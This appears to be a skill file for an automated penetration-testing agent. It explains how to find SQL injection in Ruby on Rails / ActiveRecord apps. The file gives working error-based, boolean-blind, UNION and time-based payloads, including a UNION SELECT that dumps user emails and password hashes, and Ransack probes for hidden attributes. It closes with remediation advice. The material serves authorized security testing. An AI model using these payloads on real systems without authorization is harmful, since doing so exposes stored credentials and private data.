# SQL injection (Ruby / ActiveRecord)

ActiveRecord is usually safe, but raw string interpolation and a few query APIs
are injectable. Test every GET/POST param and form field.

1. **Find inputs**: `browser_get_form_fields`, plus params seen in
   `http_history`. Note search/sort/filter params (often the unsafe ones).
2. **Error-based**: inject a single quote `'` (`browser_type`+`browser_click`+
   `browser_wait_for`, or `http_request`). Look for adapter errors in the
   response/dev trace: `ActiveRecord::StatementInvalid`,
   `PG::SyntaxError`, `Mysql2::Error`, `SQLite3::SQLException`, `near "'":
   syntax error`, `unterminated quoted string`. An error ⇒ injectable
   (`Model.where("name = '#{params[:q]}'")` interpolation).
3. **Vulnerable AR patterns** to suspect: `where("col = '#{x}'")`,
   `order(params[:sort])`, `pluck(params[:col])`, `find_by_sql`,
   `exists?(["...#{x}..."])`, `.calculate`, `group`/`having` strings.
4. **Boolean-blind**: compare `1') AND ('1'='1` (normal) vs `1') AND ('1'='2`
   (empty). Sweep both with one `http_fuzz` (marker on the param value) and read
   the `length` deltas.
5. **UNION**: column count via `' ORDER BY n-- -` (`http_fuzz` marker on
   `ORDER BY FUZZ-- -`, payloads `1..20`), then
   `' UNION SELECT email,encrypted_password FROM users-- -` and read dumped rows.
6. **Ransack** (search gem): if requests carry `q[<attr>_eq]`, `q[<attr>_cont]`,
   `q[<attr>_gt]`, the model exposes attributes for filtering — probe for
   unintended attributes (e.g. `q[encrypted_password_cont]=`,
   `q[admin_eq]=true`) and association traversal (`q[user_id_eq]`). Data
   exfiltration even without classic SQLi. `http_fuzz` the `q[...]` keys.
6. **Time-based blind** (no visible length/content delta either way): identify
   the adapter first (skill: fingerprint / adapter error text), then sweep with
   `http_fuzz` reading the `timeMs` column: PostgreSQL
   `' OR (SELECT 1 FROM pg_sleep(5))='0`, MySQL `' OR SLEEP(5)-- -`. SQLite has
   no native sleep — use a heavy recursive CTE instead: `' OR (WITH RECURSIVE
   r(x) AS (VALUES(1) UNION ALL SELECT x+1 FROM r WHERE x<2000000) SELECT
   count(*) FROM r)-- -`. A `timeMs` outlier vs baseline ⇒ injection confirmed
   with zero content difference.
7. Prefer `http_request from_flow` for a single tampered param; `http_fuzz` with
   `match_regex` on the error strings above to flag injectable rows in a sweep.

Evidence: the injected request + the AR/adapter error or dumped rows.
Remediation: never interpolate into `where`/`order` — use placeholders
(`where("name = ?", x)` / hash conditions), `sanitize_sql`, and whitelist
`order` columns. Lock Ransack down with `ransackable_attributes`/
`ransackable_associations`.
